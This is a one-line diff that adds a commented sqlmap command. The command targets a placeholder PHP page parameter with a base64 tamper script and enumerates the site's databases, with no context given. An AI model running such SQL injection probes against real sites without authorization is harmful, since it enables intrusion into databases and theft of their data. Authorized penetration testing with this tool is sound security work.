@@ -1,0 +1,1 @@
+# sqlmap -u "https://SITE.co.in/detail.php?mid=SOMEDATA" --tamper=base64encode --dbs
